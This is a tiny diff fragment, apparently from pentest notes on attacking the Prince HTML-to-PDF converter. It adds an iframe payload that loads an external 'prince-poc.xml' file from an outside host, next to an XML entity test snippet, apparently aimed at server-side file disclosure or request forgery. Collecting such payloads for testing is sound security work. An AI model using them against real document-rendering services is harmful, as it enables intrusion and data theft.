@@ -95,4 +95,6 @@ Get the user-agent --> # Prince v10
 <cdl>&asd;</cdl>
 ```
 
-
+```
+<iframe/src=https://mywebsite.com/prince-poc.xml>
+```
